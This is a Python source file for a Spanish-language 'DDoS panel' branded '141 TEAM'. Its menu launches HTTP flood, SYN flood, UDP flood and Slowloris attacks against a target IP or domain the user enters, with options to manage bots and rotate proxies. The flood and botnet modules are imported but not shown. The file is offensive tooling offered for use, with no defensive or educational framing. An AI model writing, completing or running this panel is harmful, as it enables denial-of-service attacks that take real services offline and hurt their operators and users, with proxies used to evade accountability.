import os
import time
import threading
from attack_methods.http_flood import HTTPFlood
from attack_methods.tcp_syn import SYNFlood
from attack_methods.udp_flood import UDPFlood
from attack_methods.slowloris import Slowloris
from utils.proxy_manager import ProxyManager
from utils.botnet import Botnet

class DDoSPanel:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.botnet = Botnet()
        self.running_attacks = []

    def show_banner(self):
        print("""
        \033[91m
         _____  ___   ___    _____ 
        |_   _||_ _| / _ \  | ____|
          | |   | | | | | | |  _|  
          | |   | | | |_| | | |___ 
          |_|  |___| \___/  |_____|
        
        141 | TEAM - DDoS PANEL
        \033[0m
        """)

    def start_attack(self, method, target, port, threads, duration):
        if method == "HTTP":
            attack = HTTPFlood(target, port, threads, duration)
        elif method == "SYN":
            attack = SYNFlood(target, port, threads, duration)
        elif method == "UDP":
            attack = UDPFlood(target, port, threads, duration)
        elif method == "SLOWLORIS":
            attack = Slowloris(target, port, threads, duration)
        else:
            print("¡Método no válido!")
            return

        self.running_attacks.append(attack)
        attack.start()
        print(f"[+] ¡Ataque {method} lanzado contra {target}:{port}!")

    def stop_all_attacks(self):
        for attack in self.running_attacks:
            attack.stop()
        print("[!] Todos los ataques detenidos.")

    def menu(self):
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            self.show_banner()
            print("\n\033[93m1. HTTP Flood")
            print("2. SYN Flood")
            print("3. UDP Flood")
            print("4. Slowloris")
            print("5. Administrar Bots")
            print("6. Rotar Proxies")
            print("7. Detener Ataques")
            print("8. Salir\033[0m")

            choice = input("\n> Selecciona una opción: ")

            if choice == "1":
                target = input("Objetivo (IP/Dominio): ")
                port = int(input("Puerto (80/443): "))
                threads = int(input("Hilos: "))
                duration = int(input("Duración (segundos): "))
                self.start_attack("HTTP", target, port, threads, duration)
            elif choice == "2":
                target = input("Objetivo (IP): ")
                port = int(input("Puerto: "))
                threads = int(input("Hilos: "))
                duration = int(input("Duración (segundos): "))
                self.start_attack("SYN", target, port, threads, duration)
            elif choice == "3":
                target = input("Objetivo (IP): ")
                port = int(input("Puerto: "))
                threads = int(input("Hilos: "))
                duration = int(input("Duración (segundos): "))
                self.start_attack("UDP", target, port, threads, duration)
            elif choice == "4":
                target = input("Objetivo (IP/Dominio): ")
                port = int(input("Puerto (80/443): "))
                threads = int(input("Hilos: "))
                duration = int(input("Duración (segundos): "))
                self.start_attack("SLOWLORIS", target, port, threads, duration)
            elif choice == "5":
                self.botnet.manage_bots()
            elif choice == "6":
                self.proxy_manager.rotate_proxies()
            elif choice == "7":
                self.stop_all_attacks()
            elif choice == "8":
                self.stop_all_attacks()
                print("¡Hasta la próxima, soldado de la 141!")
                break
            else:
                print("¡Opción inválida!")
            input("\nPresiona Enter para continuar...")

if __name__ == "__main__":
    panel = DDoSPanel()
    panel.menu()